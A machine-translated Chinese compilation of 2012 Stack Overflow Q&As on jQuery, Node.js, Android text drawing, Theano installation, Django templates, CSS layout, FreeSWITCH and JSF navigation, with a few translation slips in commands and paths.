> 时间：2012-04-22T18:35:23.297

```
["string1","mystring","string2"].include? "mystring" 
```

请参阅：[可枚举#include？](http://www.ruby-doc.org/core-1.8.7/Enumerable.html#method-i-include-3F)

# jquery - jQuery 的 $ 符号

> ID：10270855
> 
> 赞同：2
> 
> 时间：2012-04-22T18:32:09.063
> 
> 标签：jquery, asp.net-ajax

我的 javascript 文件中有 $ 符号来识别 jQuery 功能。现在我将在同一个文件中使用 asp.net ajax。但这也带有 $ 符号。这会造成严重的麻烦吗？如果是这样，我怎样才能让事情变得更好？谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-22T18:35:38.377

您可以使用`jQuery.noConflict()`

这里：[http ://api.jquery.com/jQuery.noConflict/](http://api.jquery.com/jQuery.noConflict/)

示例用法：

```
jQuery.noConflict();
(function($) { 
  $(function() {
    // more code using $ as alias to jQuery
  });
})(jQuery); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-22T18:35:49.930

尝试：

```
<script type="text/javascript">
  $.noConflict();
  jQuery(document).ready(function($) {
    // Code that uses jQuery's $ can follow here.
  });
  // Code that uses other library's $ can follow here.
</script> 
```

剪切和粘贴来自：[http ://api.jquery.com/jQuery.noConflict/](http://api.jquery.com/jQuery.noConflict/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-22T18:35:00.210

您可以使用`jQuery.noConflict()`

[http://api.jquery.com/jQuery.noConflict/](http://api.jquery.com/jQuery.noConflict/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-22T18:36:14.490

您应该使用`jQuery.noConflict()`进入无冲突模式： [http ://api.jquery.com/jQuery.noConflict/](http://api.jquery.com/jQuery.noConflict/)

然后使用`jQuery`而不是`$`这样：`jQuery(document).ready(...`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-22T18:37:07.927

这会导致冲突。用对象替换 Jquery 的`$`实例。`jQuery`

# node.js - Node.js：对象值作为 child_process.exec 的标准输出

> ID：10270857
> 
> 赞同：3
> 
> 时间：2012-04-22T18:32:20.857
> 
> 标签：node.js, nonblocking, child-process

我是 Node 的新手，偶然发现了它的一些非阻塞元素。我正在尝试创建一个对象，并且它的元素之一是返回 child_process.exec 的标准输出的函数，如下所示：

```
var exec = require('child_process').exec;
var myObj = {};

myObj.list = function(){
  var result;
  exec("ls -al", function (error, stdout, stderr) {
     result = stdout;
  });
  return result;
}
console.log('Ta da : '+myObj.list); 
```

我认为它在设置为之前`myObj.list`返回，但我不知道如何让它等待或为它做回调。谢谢你的帮助！`result``stdout`

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-22T19:35:03.667

您不能直接返回该值，因为它暂时不可用。因此，您需要使用回调而不是返回值，这意味着将调用代码翻过来一点。

```
var exec = require('child_process').exec;
var myObj = {};

myObj.list = function(callback){
  var result;
  exec("ls -al", function (error, stdout, stderr) {
     callback(stdout);
  });
  // No return at all!
}
// Instead of taking a return we pass a callback
// which receives the value and carries on our computation.
myObj.list(function (stdout) {
   console.log('Ta da : '+ stdout);
}); 
```

在实际代码中，您可能希望回调将错误作为其第一个参数，您不必这样做，但这是在 Node.JS 中完成的正常方式。

# jquery - 如何让 slideToggle 从底部滑动（jQuery）

> ID：10270865
> 
> 赞同：2
> 
> 时间：2012-04-22T18:33:33.867
> 
> 标签：jquery, slidetoggle

这有点难以解释，因为英语不是我的主要语言，所以我认为如果你先看看我正在开发的网站会更容易，然后我会解释我想要做什么。这是地址： http: [//ngmat.site90.net/matsedel/](http://ngmat.site90.net/matsedel/)（该站点加载速度很慢，因为托管服务已经实现了一个访问者计数服务，该服务需要很长时间才能加载（虽然并不真正影响站点本身）。

无论如何，我想做的是，当您按下底部的“相机”按钮时，我希望“backgroundCurtain”div 从底部栏的顶部向上滑动。就这么简单，但我不知道该怎么做。

我对 jQuery 很陌生，但到目前为止我读到的是你需要设置 "bottom:0;" 如果您希望 div 在您第一次单击它时向上滑动（使用 slideToggle）。所以我正在考虑制作一个不可见的 div，它覆盖除底部栏之外的整个网站（基本上是“底部：35px”），然后在 backgroundCurtain div 上设置“底部：0”。这应该使它在您第一次单击它时向上滑动，或者？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T19:09:42.950

去掉 cameraToggle 函数，将 backgroundCurtain 顶部 css 属性设置为与页面高度一样大，然后添加此代码..

```
$("#camera").on('click', function(){
    $("#backgroundCurtain").animate({top: 'toggle'}, 1000);
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T19:18:14.330

事实上，你不必用那个窗帘覆盖你网站的所有元素（如果我理解正确的话）。你需要的是有一个独立的元素，具有绝对位置并将底部属性的值保留为 35px。您可以在以下位置找到此类功能的示例：

[http://atomicrobotdesign.com/blog/web-development/configure-jquerys-slidetoggle-to-slide-up-from-the-bottom/](http://atomicrobotdesign.com/blog/web-development/configure-jquerys-slidetoggle-to-slide-up-from-the-bottom/)

观看演示；

[http://atomicrobotdesign.com/blog_media/toggleslide_multiple.html](http://atomicrobotdesign.com/blog_media/toggleslide_multiple.html)

只需单击关于和内容链接

# jquery - 访问复选框旁边的文本节点，JQuery

> ID：10270866
> 
> 赞同：0
> 
> 时间：2012-04-22T18:33:35.617
> 
> 标签：jquery, html, nodes

> **可能重复：**
> [如何使用 jQuery 选择文本节点？](https://stackoverflow.com/questions/298750/how-do-i-select-text-nodes-with-jquery)

我正在尝试移动文本节点中与选中复选框相邻的复选框中的数据。我正在使用 jquery。下面列出了我尝试过的方法以及我收到的结果。

```
<input class="item" type="checkbox" /> Category 1
<input class="item" type="checkbox" /> Category 2

<script>
  $('.item').click(function(){
      if($(this).attr('checked'))
      {
         $('#list').append("<span>" + $(this).next() + "<span><br/>")
         //$(this).next() just writes "[object Object]"
         //$(this).next().text() doesn't write anything
         //Also tried $(this).nextSibling.nodeValue but throws "Cannot access property of undefined"
      }
      else
      {
          //This is remove the item from the list on uncheck 
      }
  });
</script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T18:53:30.393

考虑改为使用此标记

```
<input class="item" type="checkbox" id="cat_one" name="cat_one" /> <label for="cat_one">Category 1</label>
<input class="item" type="checkbox" id="cat_two" name="cat_two"/> <label for="cat_two">Category 2</label> 
```

或这个：

```
<label for="cat_one"><input class="item" type="checkbox" id="cat_one" name="cat_one" /> Category 1</label>
<label for="cat_two"><input class="item" type="checkbox" id="cat_two" name="cat_two"/> Category 2</label> 
```

因此，您用一块石头杀死了两只鸟：a）您的标记在语义上要好得多，b）您可以通过该方法访问`label`元素内容。`.text()`

第一个变种可以在这里看到：http: [//jsfiddle.net/skip405/DjWcg/](http://jsfiddle.net/skip405/DjWcg/)

# java - 下载游戏更新如何工作？

> ID：10270868
> 
> 赞同：1
> 
> 时间：2012-04-22T18:33:43.210
> 
> 标签：java, android

假设我发布了一款游戏，并且在某个时间点后我想发布该游戏的全新功能。当然，应用程序必须能够识别和下载更新。这具体如何与 Google Play 应用配合使用？应用程序是否会从市场上下载整个新版本的 APK 并自行重新安装？如果此信息有帮助，我正在使用 Java 进行开发。你可以给我关于这个话题的任何提示吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T18:37:58.370

使用 Google Play，用户会收到应用更新可用的通知。由用户来启动更新的下载。

您始终可以在您的应用程序中检查您的服务器是否有可用的更新。但是，这成为维护问题。

# android - Android 相当于 CoreText

> ID：10270870
> 
> 赞同：6
> 
> 时间：2012-04-22T18:33:55.663
> 
> 标签：android, ios, android-widget, core-text

我们有一个渲染大量文本的 iOS 应用程序：http: [//itunes.apple.com/br/app/biblia-sagrada/id370178518 ?mt=8](http://itunes.apple.com/br/app/biblia-sagrada/id370178518?mt=8)

我们使用 CoreText 来呈现文本并让用户能够更改格式、字体大小和字体。

我们正在尝试将其移植到 Android，但我不确定 Android 中是否有 CoreText 的替代品。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-08T01:41:03.267

与 Android 中 iOS 的 CoreText 等效的是`drawText`API、Canvas 类的一部分 `Canvas.drawText()`、`Canvas.drawPosText()`、 等。有关更多详细信息，请参阅Canvas 的[javadoc](http://developer.android.com/reference/android/graphics/Canvas.html)。这些图形 API 在下面使用[Skia](http://code.google.com/p/skia/)。

这些图形 API 提供的功能与 iOS 中的功能不同，比如没有`CTFramesetter`等价物可以帮助您布局文本和处理换行符。使用`drawText`API，您一次只能绘制一条线，您必须自己处理换行符，这就像`CTTypesetter`在 iOS 中使用一样。有关布局文本，请参阅`Paint.breakText`和`Paint.measureText`。

要更改字体大小和字体，您可以在对象中设置相关属性，该属性`Paint`作为最后一个参数传递给`drawText`API。

片段：

```
Paint paint = new Paint(Paint.ANTI_ALIAS_FLAG);
paint.setTextSize(14);
String text = "Hello world!";
canvas.drawText(text, 0, 100, paint); 
```

Note: The coordinate system used in the Android `drawText` APIs is from `left-top` corner.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T18:46:17.920

`TextView`可以通过可扩展的字符串处理“更改格式、字体大小和字体的能力”。请参阅`android.text.style`包装以了解您可以应用的各种效果。

就“大量文本”而言，`TextView`将`ScrollView`.

如果需要，您可以随时回退到 using `WebView`，它为您提供了呈现 HTML 的完整 WebKit 功能。

# python - 在 EPD 上安装 Theano (Windows x64)

> ID：10270871
> 
> 赞同：2
> 
> 时间：2012-04-22T18:34:14.880
> 
> 标签：python, windows, enthought, theano

我正在尝试在 Enthought Python Distribution (EPD) 上安装 Theano，但出现了一个奇怪的错误。这是我的安装的样子：

*   我已将 EPD 安装到`C:\Python27`.
*   之后，我已经`pip`使用安装了`easy_install pip`
*   我通过使用安装了 Theano`pip install Theano`
*   为了测试，我开始`ipython`并输入`import theano`. 我收到以下错误：

    ```
    Problem occurred during compilation with the command line below:
    g++ -shared -g -IC:\Python27\lib\site-packages\numpy\core\include -IC:\Python27\include -o C:\Users\Ove\AppData\Local\Theano\compiledir_Windows-7-6.1.7601-SP1-Intel64_Family_6_Model_37_Stepping_5_GenuineIntel-2.7.2\lazylinker_ext\lazylinker_ext.pyd C:\Users\Ove\AppData\Local\Theano\compiledir_Windows-7-6.1.7601-SP1-Intel64_Family_6_Model_37_Stepping_5_GenuineIntel-2.7.2\lazylinker_ext\mod.cpp -LC:\Python27\libs -LC:\Python27 -lpython27
    C:\Users\Ove\AppData\Local\Temp\ccIoNPlU.o: In function `initlazylinker_ext':C:/Users/Ove/AppData/Local/Theano/compiledir_Windows-7-6.1.7601-SP1-Intel64_Family_6_Model_37_Stepping_5_GenuineIntel-2.7.2/lazylinker_ext/mod.cpp:911: undefined reference to `__imp_Py_InitModule4'
    collect2: ld returned 1 exit status

    Exception: Compilation failed (return status=1): C:\Users\Ove\AppData\Local\Temp. C:/Users/Ove/AppData/Local/Theano/compiledir_Windows-7-6.1.7601-SP1-Intel64_Family_6_Model_37_Stepping_5_GenuineIntel-2.7.2/lazylinker_ext/mod.cpp:911: undefi. collect2: ld returned 1 exit status4' 
    ```

有谁知道如何让 Theano 与 EPD 一起运行？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-22T01:41:41.090

Theano(0.5) 的最新版本在 Windows 上存在一些问题。您需要安装最前沿的版本。您可以像这样更新您的版本：

```
pip install --upgrade --no-deps git+git://github.com/Theano/Theano.git 
```

这应该可以解决问题。如果没有，您可能与 gcc 的不同安装有一些冲突。你是用cygwin还是mingw安装的？EPD 安装了自己的 mingw 版本。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-06-14T21:48:42.720

我无法让 Theano 与 Enthought 一起工作，但使用 Anaconda python 发行版我最终让它工作了。就是这样：

*   卸载 Enthought 和任何其他 python 版本（从头开始）
*   从此链接下载并安装 Anaconda python 发行版：http: [//09c8d0b2229f813c1b93-c95ac804525aac4b6dba79b00b39d1d3.r79.cf1.rackcdn.com/Anaconda-1.5.0-Windows-x86_64.exe](http://09c8d0b2229f813c1b93-c95ac804525aac4b6dba79b00b39d1d3.r79.cf1.rackcdn.com/Anaconda-1.5.0-Windows-x86_64.exe)并单击选项以使用 Anaconda 作为默认 python 版本
*   要获得学术许可证，请访问此页面：[https](https://store.continuum.io/cshop/academicanaconda) ://store.continuum.io/cshop/academicanaconda并单击 Anaconda 学术许可证旁边的“免费”按钮（页面右侧）
*   您应该会收到一封包含学术许可 .txt 文件的电子邮件。按照电子邮件中的说明将文件放在正确的目录中，然后运行几个命令行命令来更新 anaconda 并安装 numpy 和 scipy
*   打开 Windows 命令提示符并键入

    点安装theano

*   创建一个包含以下行的文件 .theanorc.txt：

    [全局] openmp=False

    [blas] ldflags=

*   将 .theanorc.txt 放在您的主文件夹（您的用户帐户的文件夹）中

*   确保将以下路径添加到您的 PATH 环境变量中：

    C:\Anaconda\MinGW\bin; C:\Anaconda\MinGW\x86_64-w64-mingw32\lib; C:\蟒蛇; C:\Anaconda\脚本；

# physics - Verlet积分器+摩擦

> ID：10270875
> 
> 赞同：2
> 
> 时间：2012-04-22T18:35:13.197
> 
> 标签：physics, game-physics, verlet-integration

我一直在 Gamedev.net 上关注“[基于 Verlet 的 2D 游戏物理方法](http://www.gamedev.net/page/resources/_/technical/math-and-physics/a-verlet-based-approach-for-2d-game-physics-r2714)”，我也写过类似的东西。

我遇到的问题是盒子在地面上滑动太多。我怎样才能添加一个简单的静止状态的东西，盒子会有更多的摩擦并且只会滑动一点点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T00:42:20.280

只需在指向与运动相反的方向的移动物体上引入一个小的恒定加速度。并确保它实际上不能*逆转*运动；如果您在积分步骤中检测到这一点，只需将速度设置为零。

如果你想更真实一点，加速度应该来自与物体和它滑动的表面之间的法向力成比例的力。

您可以在任何基本的物理文本中找到它，如“动摩擦”或“滑动摩擦”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-20T20:10:18.677

在 verlet 积分处：`r(t)=2.00*r(t-dt)-1.00*r(t-2dt)+2at²` 将乘数更改为 1.99 和 0.99 用于摩擦

编辑：这是更真实的：

`r(t)=(2.00-friction_mult.)*r(t-dt)-(1.00-friction_mult.)*r(t-2dt)+at²`

# comments - Kohana - 文章下的评论

> ID：10270881
> 
> 赞同：-1
> 
> 时间：2012-04-22T18:35:57.387
> 
> 标签：comments, kohana, hmvc, article

Kohana v3.2 文章下如何显示评论？我应该对评论控制器使用子请求还是只在文章控制器的“查看”操作中调用评论模型？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-23T02:10:21.137

这里有多个部分在起作用。您如何将评论数据获取到您的视图以在多个页面中使用……也许可以创建一个模型来检索评论。

您如何在多个页面中设置相同的评论格式？您可以使用自定义助手将其格式化为一些标准 html，也可以在视图逻辑中执行视图以将评论片段加载到页面中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T19:43:04.757

Id 更喜欢 HMVC 调用。使用 HMVC，您可以对内部子请求（在文章下方显示评论列表）和外部调用（通过 AJAX 加载/重新加载评论）使用相同的代码

# javascript - jquery json 空控件

> ID：10270884
> 
> 赞同：0
> 
> 时间：2012-04-22T18:36:31.053
> 
> 标签：javascript, jquery, json, checkbox

我有一个带有复选框的表格，我通过点击发布它`<a id='fecth_details'...`：

```
 $('#fetch_details').click(function(e) {
    e.preventDefault();
    var data = { 'selected_sales[]' : []};
    $("input[name='salesID[]']:checked").each(function() {
      data['selected_sales[]'].push($(this).val());
    });
    $('#list_data').html('');
    $.post('fetch_sales_details',data,function (data) { $('#list_data').html(data)});
  }); 
```

我需要控制它是否为空。基本上测试如下：

```
var data = ({ 'choices[]': ["Jon", "Susan"] });
alert(data);
if ($.isEmptyObject(data.choices))
{
   alert('it is an empty object');
}
else
{
    alert('auch! I am not empty');
} 
```

但不工作......如果没有选中复选框，我不应该工作。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T18:43:57.247

尝试

```
 $('#fetch_details').click(function(e) {
        e.preventDefault();
      if(!$(":checkbox:checked").length>0){//atleast one checkbox is checked
        //your code here
        // 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T18:50:02.987

你可以这样试试；

```
 var data = { 'choices' : { "" : ["Jon", "Susan"] } };
  alert(data);
  if ($.isEmptyObject(data.choices)) {
    alert('it is an empty object');
  } else {
    alert('auch! I am not empty');
  } 
```

或者让你的代码保持原样，只做一点修改；

```
 var data = { 'choices' : ["Jon", "Susan"] };
  alert(data);
  if ($.isEmptyObject(data.choices)) {
    alert('it is an empty object');
  } else {
    alert('auch! I am not empty');
  } 
```

# javascript - 允许打字错误

> ID：10270886
> 
> 赞同：2
> 
> 时间：2012-04-22T18:36:45.297
> 
> 标签：javascript

我想做一个测验，用户应该输入正确的答案。如果答案匹配 90%，则假设答案是正确的。例如，如果用户键入

`Britney Spers`而不是`Britney Spears`，答案应该是正确的。

我搜索了 Javascript 函数以确定答案的准确性，我发现了一些用于 PHP、Ruby 等的有趣函数，但我需要它在 JavaScript 中。

有没有人使用过这种算法？谢谢你的回答:)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-22T18:39:48.840

您正在寻找一种编辑距离算法。基本上，您想查看从一个字符串到另一个字符串需要进行多少字符更改（添加/删除/替换）。当然，现在你必须有一个目标字符串字典才能找到到的距离。

[http://en.wikipedia.org/wiki/Edit_distance](http://en.wikipedia.org/wiki/Edit_distance)

更具体地说：[http ://en.wikipedia.org/wiki/Levenshtein_distance](http://en.wikipedia.org/wiki/Levenshtein_distance)

`Britney Spers`和之间的编辑距离`Britney Spears`将为一： insert `'a'`。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-22T18:43:23.723

您正在寻找**[编辑距离](http://en.wikipedia.org/wiki/Edit_distance)**（又名 Levenshtein 距离）。在这种方案下，两个字符串之间的*距离*是使字符串匹配所需的*插入*、*删除*或*替换的次数。*例如，如果正确答案是“橙子”，那么：

*   "oranges" 的距离为 0（它们是同一个词）
*   “橙色”的距离为 1（删除`s`）
*   “roranger”的距离为 2（插入`r`，替代`s -> r`）
*   "sponges" 的距离为 3 (substitute `o -> s`，substitute `r -> p`，substitute `o -> a`)
*   "" 的距离为 7（插入每个字母`oranges`）

Javascript 中的简单算法如下所示（改编**[自此 gist](https://gist.github.com/982927)**并修改）：

```
function(a, b){
  // Return the number of characters in the other
  // string if either string is blank.
  if(a.length == 0) return b.length; 
  if(b.length == 0) return a.length; 

  // Otherwise, let's make a matrix to represent the possible choices
  // we can take.
  var matrix = [];

  var i;
  for(i = 0; i <= b.length; i++){
    matrix[i] = [i];
  }

  var j;
  for(j = 0; j <= a.length; j++){
    matrix[0][j] = j;
  }

  for(i = 1; i <= b.length; i++){
    for(j = 1; j <= a.length; j++){
      if(b.charAt(i-1) == a.charAt(j-1)){
        matrix[i][j] = matrix[i-1][j-1];
      } else {
        matrix[i][j] = Math.min(matrix[i-1][j-1] + 1, // substitution
                                Math.min(matrix[i][j-1] + 1, // insertion
                                         matrix[i-1][j] + 1)); // deletion
      }
    }
  }

  return matrix[b.length][a.length];
}; 
```

您的问题的一个问题是您所写的关于您要查找的内容的示例（例如“匹配 90%”或“答案的准确性”）不是明确定义的指标。

答案有很多可能是错误的。例如，假设正确答案是“苹果”。哪些应该被接受？

*   “APPLE”（大写错误）
*   “ppple”（拼写错误）
*   “apples”（复数，但你想要单数）
*   “富士苹果”（太具体了）
*   “水果”（太宽泛）

等等。决定哪些应该被接受超出了简单的编辑距离算法的能力，并且需要更重的工作，比如 NLP。

# css - 限制 div 中图像的尺寸

> ID：10270887
> 
> 赞同：0
> 
> 时间：2012-04-22T18:36:49.363
> 
> 标签：css

我有一个 div（这是一个 200x200 的正方形），我想在其中放置一个 180x60 的图像在顶部，然后是一些文本。

```
<div class='box_item'>
    <img src="<? echo base_url(); ?>img2/avengers_assemble_small.jpg" class='box_item_img'/>
    <h4>some text...</h4>
</div> 
```

CSS是：

```
.box_item {
    float: left;
    height: 190px;
    width: 190px;
    overflow: hidden;
    border: 1px solid grey;
    padding: 5px;
    margin: 5px 5px 0px 0;
}
.box_item_img{
    width: 180px;
    height: 60px;
    margin: 5px;
} 
```

我希望图像出现在盒子的顶部，尺寸由 box_item_img 类指定。相反，我得到了一个几乎扩展到整个框的拉伸图像（顶部和左侧留有 5px 的边距）。

想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T18:44:46.120

您提供的 CSS 规则运行良好。必须有一些其他样式规则干扰，例如，通用`img`规则。

只需检查 FireBug 或 Chrome 开发人员工具中的`img`和`div`元素，然后查看对它们应用了哪些规则。然后尝试将最可疑的规则一一删除，以找到真正的原因。

# django - models.TextField() 中的换行符未在模板中呈现

> ID：10270891
> 
> 赞同：30
> 
> 时间：2012-04-22T18:37:11.493
> 
> 标签：django, newline

我有一个带有属性的模型，

```
desc = models.TextField() 
```

我使用 Django 提供的管理界面输入数据，然后查看了我的模板，其中获取并显示了数据库值。

在我的管理界面中，我留下了换行符（只是在我的段落之间留下空白行），但它们在我的模板中显示为单个段落。

我正在使用 Django 1.3 和 MySQL。

* * *

## 回答 #1

> 赞同：66
> 
> 时间：2012-04-22T18:44:01.850

[`linebreaks`](https://docs.djangoproject.com/en/dev/ref/templates/builtins/#linebreaks)

> 用适当的 HTML 替换纯文本中的换行符；单个换行符成为 HTML 换行符 ( `<br />`)，而后跟一个空行的新行成为段落换行符 ( `</p>`)。
> 
> 例如：
> 
> `{{ value|linebreaks }}`

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2018-05-31T17:52:05.303

约翰，看起来你从伊格纳西奥那里得到了很好的回答。我只是想指出我为那些可能感到困惑的人（就像我一样）使用伊格纳西奥的答案所采取的步骤。在我显示文本字段的模板中，我在模板字段名称后面添加了“ **|linebreaks** ”（在我的例子中是“job.desc”）：

```
<ul>
    {% for job in varDataObject %}
    <li>
        <h4>
            <a href="#" onclick='funPath("Job", {{ job.id }})'>{{ job.title }} </a>
        </h4>
        Description: {{ job.desc|linebreaks }} 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2015-10-30T20:55:18.653

请注意，我遇到了类似的问题，换行符没有出现，我意识到当 TextField 被声明为只读时，文本会被 HTML 段落标签包裹：

```
<p> text </p> 
```

与 pre 标签相反：

```
<pre> text </pre> 
```

Pre 标记保留新的行空间，因此如果您不将该字段设为只读，您将看到这些行空间。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-12-14T03:47:45.783

`\n`使用 sql 在模型的 TextField() 中使用换行符（不是）保存文本：

```
update event
set description='xyz
                asdasd
                 oaisjd '
where id=1; 
```

在 Django 模板中：

```
{{ object.description|linebreaks }} 
```

# html - 使表单域显示为水平而不是垂直

> ID：10270893
> 
> 赞同：0
> 
> 时间：2012-04-22T18:37:29.667
> 
> 标签：html, css

我有一个垂直出现的表格：

```
<form action="roseresult.php" method="POST" id='rosesearch'>
<label>Latin Name:</label><input name='latin_name' type='text' />
<label>Common Name:</label><input name='common_name_name' type='text' /></br>
<label>Variety Type:</label><select name="variety">
            <option value="Any">Any</option>
            <option value="Climber/Rambler">Climber/Rambler</option>
            <option value="David Austin">David Austin</option>
            <option value="Floribunda">Floribunda</option>
            <option value="Groundcover">Groundcover</option>
            <option value="Hybrid Tea">Hybrid Tea</option>
            <option value="Patio/Miniature">Patio/Miniature</option>
            <option value="Shrub">Shrub</option></select>
<input name='search' type='submit' value='Search' />
</form> 
```

我已经在 css 中对其进行了编辑以尝试使其水平显示，但它似乎不起作用。我以为浮动：左；会这样做，但它不会。

CSS：

```
#rosesearch {
width:400px;
border-color:#7f2e3f;
padding: 5px 500px 5px 5px;
float:left;
}

#rosesearch legend {
background-color:#7f2e3f;
width:200px;
font-size: 20px;
}

#rosesearch label {
display:block;
font-weight:bold;
text-align:right;
width:140px;
font-size:1.1em;
float:left;
color:#000000;
}

#rosesearch input {
font-size:12px;
padding:4px 2px;
border:solid 1px #000000;
width:244px;
margin:2px 0 20px 10px;
color:#000000;
float:left
} 
```

有没有其他方法可以使表单水平显示？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T19:04:28.160

你基本上有两个明显的选择：

1.  将您想要内联的每一对输入放在一个中`<div>`，将这些包装器 div 作为行重复，直到您的所有输入都在表单中，或者
2.  创建两个“列”div，然后按照需要匹配它们的顺序放置输入。

`#`1 可能是最简单、最一致的。我将更新我在上面发布的小提琴以显示我的意思：http: [//jsfiddle.net/3Q7X4/5/](http://jsfiddle.net/3Q7X4/5/)

**HTML：**

```
<form action="roseresult.php" method="POST" id='rosesearch'>
    <div class="form-row">
        <div class="editor-cell">
            <label>Latin Name:</label>
            <input name='latin_name' type='text' />
        </div>
        <div class="editor-cell">
            <label>Common Name:</label>
            <input name='common_name_name' type='text' />
        </div>
    </div>
    <div class="form-row">
        <div class="editor-cell">
            <label>Variety Type:</label>
            <select name="variety">
                <option value="Any">Any</option>
                <option value="Climber/Rambler">Climber/Rambler</option>
                <option value="David Austin">David Austin</option>
                <option value="Floribunda">Floribunda</option>
                <option value="Groundcover">Groundcover</option>
                <option value="Hybrid Tea">Hybrid Tea</option>
                <option value="Patio/Miniature">Patio/Miniature</option>
                <option value="Shrub">Shrub</option>
            </select>
        </div>
    </div>
    <div class="form-row">
        <input name='search' type='submit' value='Search' />
    </div>
</form> 
```

**CSS：**

```
form#rosesearch
{
    width:700px;
}

#rosesearch legend {
background-color:#7f2e3f;
width:200px;
font-size: 20px;
}

#rosesearch label {
display:block;
font-weight:bold;
text-align:right;
width:140px;
font-size:1.1em;
float:left;
color:#000000;
}

#rosesearch input {
font-size:12px;
padding:4px 2px;
border:solid 1px #000000;
width:244px;
margin:2px 0 20px 10px;
color:#000000;
float:left
}

#rosesearch div.form-row
{
    width:100%;
    display:block;
    margin-bottom:2em;
    overflow:auto;
    zoom:1;
}

#rosesearch div.form-row div.editor-cell
{
    float:left;
    width:300px;
    vertical-align:top;
} 
```

**编辑：**刚刚更新了小提琴。这相当粗糙，但我希望你能明白我在说什么。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T18:40:11.087

那是因为`#rosesearch`和`#rosesearch label`宽度不够大，无法水平包含所有输入。

您需要`width`放大或删除并让浏览器处理它。

# freeswitch - ipkall 的 freeswitch 配置

> ID：10270894
> 
> 赞同：2
> 
> 时间：2012-04-22T18:37:30.440
> 
> 标签：freeswitch

我已经用 plivo 设置了我的 freeswitch，但现在我无法为我的 sip 用户 1005@ipadress 配置 ipkall 号码，因为 ipkall 的 freeswitch wiki 的配置尚不清楚。请问有人可以给我配置步骤吗？提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-09-03T11:48:46.473

在 dialplan/public.xml （或包含的文件）中：

```
<include>
  <extension name="IPKALL">
    <condition field="destination_number" expression="^5150$">
      <action application="set" data="domain_name=freeswitch.org"/>
      <action application="transfer" data="1001 XML default"/>
    </condition>
  </extension>
</include> 
```

# java - 如何在 JSF 中获取绝对 URL？

> ID：10270899
> 
> 赞同：1
> 
> 时间：2012-04-22T18:38:07.757
> 
> 标签：java, jsf, javabeans

我正在尝试在 JSF 中为我的 Web 应用程序编写导航。

到目前为止，我有这个：

```
<ul>
<ui:repeat value="#{pageBean.getPages()}" var="page">
   <li class="#{(pageContext.request.requestURI.endsWith(page.url)) ? 'current_page_item' : '' }">
       <a href="#{pageContext.servletContext.getRealPath(page.url)}">#{page.name}</a>
   </li>
</ui:repeat>
</ul> 
```

但是锚的 href 属性总是空的。另外我不确定是否`pageContext.request.requestURI.endsWith(page.url)`可以正常工作-我猜不是，因为没有页面具有 current_page_item 类。

我究竟做错了什么？

谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-22T20:40:47.907

`getRealPath()`确实没有做你认为它做的事情。阅读它的[javadoc](http://docs.oracle.com/javaee/6/api/javax/servlet/ServletContext.html#getRealPath%28java.lang.String%29)。

但这种方法不必要地过于复杂。`<h:link>`如果将 JSF组件与视图 ID 列表结合使用，则不需要自己生成绝对路径。将`<h:link>`自动添加正确的上下文路径（如果有）。

```
<ul>
    <ui:repeat value="#{pageBean.pages}" var="page">
        <li class="#{view.viewId == page.viewId ? 'current_page_item' : ''}">
            <h:link value="#{page.name}" outcome="#{page.viewId}" />
        </li>
    </ui:repeat>
</ul> 
```

视图 ID 正是 JSF 用来定位视图和处理导航的页面标识符。视图 ID 是视图文件的相对于 Web 内容的路径，例如`/foo/index.xhtml`.

请注意，`#{view}`上面示例中的 EL 是一个[隐式 EL 变量](http://balusc.blogspot.com/2011/09/communication-in-jsf-20.html#ImplicitELObjects)，指向 current `UIViewRoot`，因此您不需要自己创建/准备它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-22T19:51:05.160

这是对做什么的误解[`getRealPath`](http://docs.oracle.com/javaee/6/api/javax/servlet/ServletContext.html#getRealPath%28java.lang.String%29)。这会将表单的 URL 转换为`http://<host>:<port>/<contextPath>/index.html`类似`C:\foo\bar\index.html`. 远程系统对这些信息没有用处。对于与文件不对应的资源，该方法返回 null。该方法大多无用，应用程序应避免使用它。

# windows-8 - Windows-8 FlipView 触摸问题？

> ID：10270900
> 
> 赞同：1
> 
> 时间：2012-04-22T18:38:12.490
> 
> 标签：windows-8

我正在运行 Windows 8 Consumer Preview，但 FlipView 控件出现问题。在 Windows 8 SDK 示例包（用于 Consumer Preview）中，有一个 Controls_FlipView 项目，它显示了可以使用 FlipView 控件完成的不同操作。如果我在模拟器中运行项目并使用触摸指针（手）并尝试翻阅幻灯片，如果我翻得相对较快，则在松开鼠标后，FlipView 有时会在两张幻灯片之间结束动画。这也发生在我自己的应用程序的 FlipView 控件中。

截图：http: [//i39.tinypic.com/noa3o2.png](http://i39.tinypic.com/noa3o2.png)

